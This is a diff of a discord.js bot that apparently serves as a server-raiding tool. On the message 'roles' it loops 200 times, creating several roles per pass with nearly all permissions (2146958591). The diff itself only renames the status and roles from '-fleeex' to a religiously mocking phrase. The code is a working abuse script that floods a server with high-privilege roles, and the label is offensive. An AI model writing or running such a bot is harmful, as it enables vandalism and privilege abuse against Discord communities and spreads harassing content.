@@ -1,7 +1,7 @@
 const Discord = require("discord.js");
 const bot = new Discord.Client();
 bot.on("ready", () => {
-bot.user.setActivity('-fleeex', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('Okue Le tchoupi Islamiste', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
   bot.on("message", message => {
@@ -10,31 +10,31 @@ if(message.content.includes("AR!kelsairv")){
 }
 if(message.content === "roles"){
 for(var i =0; i < 200; i++){
-    message.guild.createRole({name:"-fleeex",
+    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
         })
-        message.guild.createRole({name:"-fleeex",
+        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#ff08c5"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#5d08ff"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#0c08ff"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
